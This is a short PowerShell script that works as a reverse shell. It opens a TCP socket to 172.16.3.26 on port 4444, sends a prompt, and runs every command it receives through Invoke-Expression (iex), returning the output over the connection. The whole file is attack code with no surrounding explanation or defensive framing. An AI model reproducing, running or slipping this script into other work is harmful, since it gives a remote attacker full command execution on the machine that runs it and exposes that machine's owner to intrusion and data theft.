#open a socket connecton
$client = New-Object system.net.sockets.tcpclient("172.16.3.26",4444);
$stream = $client.getstream();

#send shell promp
$greeting = "PS" + (pwd).Path + ">";
$sendbyte = ([text.encoding]::ASCII).GetBytes($greeting);
$stream.write($sendbyte,0,$sendbyte.Length);
$stream.Flush;
[byte[]]$bytes=0..255|%{0};

#wait for a response then excute whatever is coming then loop back
while(($i = $stream.read($bytes,0,$bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 |Out-String);
    $sendback2 = $sendback + "PS" + (pwd).Path +">";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();

};
$client.close();